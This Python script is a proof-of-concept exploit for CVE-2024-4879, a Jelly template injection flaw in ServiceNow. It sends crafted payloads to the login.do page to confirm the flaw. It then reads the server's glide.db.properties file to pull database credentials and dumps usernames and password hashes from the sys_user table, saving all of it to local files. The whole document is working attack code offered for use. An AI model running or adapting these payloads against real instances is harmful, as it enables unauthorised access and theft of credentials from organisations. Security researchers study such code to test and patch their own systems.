import requests
import argparse
import sys
import urllib3
import os
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def ascii():
    art = """   
  ____ _               _                   
 / ___| |__   ___  ___| |_   ___  ___  ___ 
| |  _| '_ \ / _ \/ __| __| / __|/ _ \/ __|
| |_| | | | | (_) \__ \ |_  \__ \  __/ (__ 
 \____|_| |_|\___/|___/\__| |___/\___|\___|
 POC CVE 2024-4879 Injection-on-ServiceNow
 âœ” github.com/fa-rrel/
"""
    print(art)

def checkVuln(targetIP):
    try:
        checkUrl = f"https://{targetIP}/login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Egs.addErrorMessage(668.5*2);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E"
        print("\033[92m\n[+] Checking the target \n \033[0m")
        response = requests.get(checkUrl, verify=False, timeout=10)
        
        if response.status_code == 200:
            if '1337' in response.text:
                print("\033[92mTarget is vulnerable!! \033[0m \n")
                getUserChoice = input("\033[92mFetch DB Info? (Y)es or (N)o \033[0m \n")
                if getUserChoice.lower() in ["y", "yes"]:
                    getDBinfo(targetIP)
                else:
                    print("Exiting...")
                    sys.exit()
            else:
                print("\033[91mTarget might not be vulnerable...\033[0m")
        else:
            print("\033[91mTarget cannot be reached...\033[0m")
            print("Exiting...")
            sys.exit()
                
    except Exception as e:
        print(f"Some error occurred: {e}")
        print("Exiting...")
        sys.exit()

def getDBinfo(targetIP):  
    getDBinfoURL = f"https://{targetIP}/login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly:core%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Ez=new%20Packages.java.io.File(%22%22).getAbsolutePath();z=z.substring(0,z.lastIndexOf(%22/%22));u=new%20SecurelyAccess(z.concat(%22/co..nf/glide.db.properties%22)).getBufferedReader();s=%22%22;while((q=u.readLine())!==null)s=s.concat(q,%22%5Cn%22);gs.addErrorMessage(s);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E"
    
    try:
        response = requests.get(getDBinfoURL, verify=False, timeout=10)
        
        if response.status_code == 200 and 'glide.db.properties' in response.text:
            print("\033[92mFetching the DB info.. \033[0m \n")
            
            os.makedirs(targetIP, exist_ok=True)
            
            pattern = r'glide\.db\.(name|rdbms|url|user|password)\s*&#61;\s*(\S+)'
            matches = re.findall(pattern, response.text)
            extracted_values = {f'glide.db.{key}': value for key, value in matches}
            
            with open(os.path.join(targetIP, 'DBinfo'), 'w') as f:
                for key, value in extracted_values.items():
                    f.write(f"{key}: {value}\n")
                    print(f"{key}: {value}")
                    
            userDBInstance(targetIP)
        else:
            print("\033[91mCould not fetch DB info...\033[0m")

    except Exception as e:
        print(f"Some error occurred: {e}")
        print("Exiting...")
        sys.exit()
 
def userDBInstance(targetIP):
    userDBInstanceUrl = f"https://{targetIP}/login.do?jvar_page_title=%3Cstyle%3E%3Cj%3Ajelly%20xmlns%3Aj%3D%22jelly%3Acore%22%20xmlns%3Ag%3D%27glide%27%3E%3Cg%3Aevaluate%3Egr%3Dnew%20GlideRecord%28%22sys_user%22%29%3Bgr.query%28%29%3Bs%3D%22%22%3Bwhile%28gr.next%28%29%29s%3Ds.concat%28gr.user_name%2C%22%20%3A%20%22%2Cgr.user_password%2C%22%3Cbr%2F%3E%22%29%3Bgs.addErrorMessage%28s%29%3B%3C%2Fg%3Aevaluate%3E%3C%2Fj%3Ajelly%3E%3C%2Fstyle%3E"
    
    try:
        response = requests.get(userDBInstanceUrl, verify=False, timeout=10)
        
        if response.status_code == 200 and 'Error Message' in response.text:
            print("\033[92m\nAttempting to fetch the User DB of the instance.. \033[0m \n")
            
            pattern = r'Error Message(?:.*?)(.*): <br />'
            matches = re.findall(pattern, response.text)
            
            if matches:
                result = matches[-1] + ": <br />"
                cleaned_result = result.replace(': <br />', ' ').replace('&#61;', '=').replace('<br />', ' ').replace('</span></span><div class="outputmsg_text">', '').replace(' : ', ':')
                info_list = cleaned_result.split()
                
                with open(os.path.join(targetIP, 'userDBInstanceInfo'), 'a') as g:
                    for i in info_list:
                        g.write(i + '\n')
                        print(i)
            else:
                print("\033[91mCould not fetch the User DB of the instance..\033[0m")
        
        else:
            print("\033[91mUser DB of the instance not found\033[0m")
    
    except Exception as e:
        print(f"Some error occurred: {e}")
        print("Exiting...")
        sys.exit()  
           
def main():
    parser = argparse.ArgumentParser(description="CVE-2024-4879")
    parser.add_argument("-i", '--targetIP', required=True, help="The target URL")
    args = parser.parse_args()
    
    try:
        ascii()
        checkVuln(args.targetIP)
    except Exception as e:
        print(f"Some error occurred: {e}")
        sys.exit()

if __name__ == "__main__":
    main()
